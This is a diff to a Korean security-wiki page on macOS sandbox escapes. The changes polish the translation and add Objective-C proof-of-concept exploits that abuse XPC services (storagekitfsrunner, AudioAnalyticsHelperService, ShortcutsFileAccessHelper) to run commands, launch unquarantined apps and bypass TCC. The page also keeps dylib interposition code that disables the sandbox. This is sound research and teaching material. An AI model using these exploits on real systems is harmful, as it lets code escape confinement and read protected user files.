@@ -6,11 +6,11 @@
 
 <figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-이전 이미지에서 **샌드박스가 어떻게 로드될 것인지**를 관찰할 수 있습니다. 이는 **`com.apple.security.app-sandbox`** 권한을 가진 애플리케이션이 실행될 때 발생합니다.
+이전 이미지에서 **샌드박스가 어떻게 로드되는지** 관찰할 수 있습니다. 이는 **`com.apple.security.app-sandbox`** 권한을 가진 애플리케이션이 실행될 때 발생합니다.
 
 컴파일러는 `/usr/lib/libSystem.B.dylib`를 바이너리에 링크합니다.
 
-그런 다음, **`libSystem.B`**는 여러 다른 함수를 호출하여 **`xpc_pipe_routine`**이 애플리케이션의 권한을 **`securityd`**에 전송할 때까지 진행합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리합니다.\
+그런 다음, **`libSystem.B`**는 여러 다른 함수를 호출하여 **`xpc_pipe_routine`**이 애플리케이션의 권한을 **`securityd`**에 전송합니다. Securityd는 프로세스가 샌드박스 내에서 격리되어야 하는지 확인하고, 그렇다면 격리합니다.\
 마지막으로, 샌드박스는 **`__sandbox_ms`**에 대한 호출로 활성화되며, 이는 **`__mac_syscall`**을 호출합니다.
 
 ## Possible Bypasses
@@ -19,10 +19,10 @@
 
 **샌드박스화된 프로세스에 의해 생성된 파일**은 샌드박스 탈출을 방지하기 위해 **격리 속성**이 추가됩니다. 그러나 샌드박스화된 애플리케이션 내에서 **격리 속성이 없는 `.app` 폴더를 생성**할 수 있다면, 애플리케이션 번들 바이너리를 **`/bin/bash`**로 가리키게 하고 **plist**에 몇 가지 환경 변수를 추가하여 **`open`**을 악용하여 **새 애플리케이션을 샌드박스 없이 실행**할 수 있습니다.
 
-이것은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**에서 수행된 것입니다.**
+이것은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**에서 수행된 작업입니다.**
 
 > [!CAUTION]
-> 따라서 현재로서는 **격리 속성이 없는 `.app`**로 끝나는 이름의 폴더를 생성할 수 있다면, 샌드박스를 탈출할 수 있습니다. macOS는 **`.app` 폴더**와 **주 실행 파일**에서만 **격리** 속성을 **확인**하기 때문입니다 (그리고 우리는 주 실행 파일을 **`/bin/bash`**로 가리키게 할 것입니다).
+> 따라서 현재로서는 **`.app`**로 끝나는 이름의 폴더를 격리 속성 없이 생성할 수 있다면, 샌드박스를 탈출할 수 있습니다. macOS는 **`.app` 폴더**와 **주 실행 파일**에서만 **격리** 속성을 **확인**하기 때문입니다 (그리고 우리는 주 실행 파일을 **`/bin/bash`**로 가리키게 할 것입니다).
 >
 > 이미 실행할 수 있도록 승인된 .app 번들이 있다면 (실행 승인 플래그가 있는 격리 xttr가 있는 경우), 그것을 악용할 수도 있습니다... 단, 이제는 샌드박스 내에서 **`.app`** 번들에 쓸 수 없게 됩니다. (특권 TCC 권한이 없기 때문입니다).
 
@@ -41,9 +41,9 @@ macos-office-sandbox-bypasses.md
 
 ### Abusing Auto Start Locations
 
-샌드박스화된 프로세스가 **나중에 샌드박스 없이 실행될 애플리케이션이 바이너리를 실행할 위치에** **쓰기**가 가능하다면, 그곳에 바이너리를 **배치하기만 하면** 탈출할 수 있습니다. 이러한 위치의 좋은 예는 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`입니다.
+샌드박스화된 프로세스가 **나중에 샌드박스 없이 실행될 애플리케이션이 바이너리를 실행할 위치에** **쓰기** 할 수 있다면, 그곳에 바이너리를 배치함으로써 **탈출할 수 있습니다**. 이러한 위치의 좋은 예는 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`입니다.
 
-이를 위해서는 **2단계**가 필요할 수 있습니다: **더 관대하게 설정된 샌드박스** (`file-read*`, `file-write*`)에서 프로세스를 실행하여 실제로 **샌드박스 없이 실행될** 위치에 코드를 작성하게 합니다.
+이를 위해서는 **2단계**가 필요할 수 있습니다: **더 관대한 샌드박스** (`file-read*`, `file-write*`)를 가진 프로세스를 실행하여 실제로 **샌드박스 없이 실행될 위치에** 코드를 작성하게 합니다.
 
 **자동 시작 위치**에 대한 이 페이지를 확인하세요:
 
@@ -53,29 +53,190 @@ macos-office-sandbox-bypasses.md
 
 ### Abusing other processes
 
-샌드박스 프로세스에서 **덜 제한적인 샌드박스**(또는 없는 샌드박스)에서 실행 중인 다른 프로세스를 **타격**할 수 있다면, 그들의 샌드박스로 탈출할 수 있습니다:
+샌드박스 프로세스에서 **덜 제한적인 샌드박스**(또는 없는 샌드박스)에서 실행 중인 다른 프로세스를 **타격**할 수 있다면, 그들의 샌드박스를 탈출할 수 있습니다:
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-### Static Compiling & Dynamically linking
+### Available System and User Mach services
 
-[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)는 샌드박스를 우회하는 2가지 방법을 발견했습니다. 샌드박스는 **libSystem** 라이브러리가 로드될 때 사용자 공간에서 적용됩니다. 바이너리가 이를 로드하지 않도록 할 수 있다면, 샌드박스에 걸리지 않을 것입니다:
+샌드박스는 또한 프로필 `application.sb`를 통해 특정 **Mach 서비스**와 통신할 수 있도록 허용합니다. 이러한 서비스 중 하나를 **악용**할 수 있다면 **샌드박스를 탈출**할 수 있습니다.
 
-- 바이너리가 **완전히 정적으로 컴파일**되었다면, 해당 라이브러리를 로드하지 않을 수 있습니다.
-- **바이너리가 어떤 라이브러리도 로드할 필요가 없다면** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.
+[이 글](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 언급된 바와 같이, Mach 서비스에 대한 정보는 `/System/Library/xpc/launchd.plist`에 저장됩니다. `<string>System</string>` 및 `<string>User</string>`를 해당 파일에서 검색하여 모든 시스템 및 사용자 Mach 서비스를 찾을 수 있습니다.
 
-### Shellcodes
+또한, `bootstrap_look_up`을 호출하여 샌드박스화된 애플리케이션에 Mach 서비스가 사용 가능한지 확인할 수 있습니다.
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
 
-**셸코드**조차도 ARM64에서 `libSystem.dylib`에 링크되어야 함을 유의하세요:
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### 사용 가능한 PID Mach 서비스
+
+이 Mach 서비스는 [이 문서에서 샌드박스를 탈출하기 위해 처음으로 악용되었습니다](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). 그 당시, **애플리케이션과 그 프레임워크에서 요구되는 모든 XPC 서비스**가 앱의 PID 도메인에서 볼 수 있었습니다 (이들은 `ServiceType`이 `Application`인 Mach 서비스입니다).
+
+**PID 도메인 XPC 서비스에 연락하기 위해서는**, 앱 내에서 다음과 같은 한 줄로 등록하기만 하면 됩니다:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+또한, `System/Library/xpc/launchd.plist`에서 `<string>Application</string>`를 검색하여 모든 **Application** Mach 서비스를 찾는 것이 가능합니다.
+
+유효한 xpc 서비스를 찾는 또 다른 방법은 다음의 서비스를 확인하는 것입니다:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+이 기술을 악용한 여러 예시는 [**원본 작성물**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 찾을 수 있지만, 다음은 요약된 몇 가지 예입니다.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+이 서비스는 항상 `YES`를 반환하여 모든 XPC 연결을 허용하며, 메서드 `runTask:arguments:withReply:`는 임의의 명령을 임의의 매개변수로 실행합니다.
+
+익스플로잇은 "매우 간단했다":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+이 XPC 서비스는 항상 YES를 반환하여 모든 클라이언트를 허용했으며, 메서드 `createZipAtPath:hourThreshold:withReply:`는 기본적으로 압축할 폴더의 경로를 지정할 수 있게 해주었습니다. 그리고 그것은 ZIP 파일로 압축됩니다.
+
+따라서 가짜 앱 폴더 구조를 생성하고 압축한 다음, 이를 풀고 실행하여 샌드박스를 탈출할 수 있습니다. 새로운 파일은 격리 속성을 가지지 않기 때문입니다.
+
+익스플로잇은:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+이 XPC 서비스는 `extendAccessToURL:completion:` 메서드를 통해 XPC 클라이언트에 임의의 URL에 대한 읽기 및 쓰기 액세스를 제공합니다. XPC 서비스가 FDA를 가지고 있기 때문에 이러한 권한을 악용하여 TCC를 완전히 우회할 수 있습니다.
+
+익스플로잇은:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
+### 정적 컴파일 및 동적 링크
+
+[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)는 샌드박스를 우회하는 2가지 방법을 발견했습니다. 샌드박스는 **libSystem** 라이브러리가 로드될 때 사용자 공간에서 적용됩니다. 이진 파일이 이를 로드하는 것을 피할 수 있다면, 샌드박스에 걸리지 않을 것입니다:
+
+- 이진 파일이 **완전히 정적으로 컴파일**되었다면, 해당 라이브러리를 로드하는 것을 피할 수 있습니다.
+- **이진 파일이 어떤 라이브러리도 로드할 필요가 없다면** (링커도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.
+
+### 셸코드
+
+**셸코드**조차도 ARM64에서는 `libSystem.dylib`에 링크되어야 합니다:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Entitlements
+### 상속되지 않는 제한
 
-특정 **권한**이 있는 애플리케이션의 경우, **샌드박스**에서 일부 **작업**이 **허용될 수** 있음을 유의하십시오.
+**[이 글의 보너스](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**에서 설명된 것처럼, 샌드박스 제한은 다음과 같습니다:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+새 프로세스가 예를 들어 실행됨으로써 우회될 수 있습니다:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+그러나 물론 이 새로운 프로세스는 부모 프로세스의 권한이나 특권을 상속받지 않습니다.
+
+### 권한
+
+어떤 **작업**이 특정 **권한**이 있는 애플리케이션의 경우 **샌드박스**에 의해 **허용될 수** 있다는 점에 유의하십시오.
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -93,7 +254,7 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 ../../../macos-proces-abuse/macos-function-hooking.md
 {{#endref}}
 
-#### 샌드박스를 방지하기 위해 `_libsecinit_initializer`를 인터포스트합니다.
+#### 샌드박스를 방지하기 위해 `_libsecinit_initializer`를 인터포스팅합니다.
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -117,7 +278,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-#### Interpost `__mac_syscall`로 샌드박스를 방지하기
+#### Interpost `__mac_syscall`로 샌드박스 방지
 ```c:interpose.c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -161,7 +322,7 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
-### lldb로 샌드박스 디버깅 및 우회
+### lldb로 Sandbox 디버그 및 우회
 
 샌드박스되어야 하는 애플리케이션을 컴파일해 보겠습니다:
 
@@ -295,7 +456,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-> [!WARNING] > **샌드박스를 우회하더라도 TCC**는 사용자가 프로세스가 데스크탑에서 파일을 읽는 것을 허용할지 물어봅니다.
+> [!WARNING] > **샌드박스를 우회하더라도 TCC**는 사용자가 프로세스가 데스크탑에서 파일을 읽는 것을 허용할지 물어볼 것입니다.
 
 ## References
 
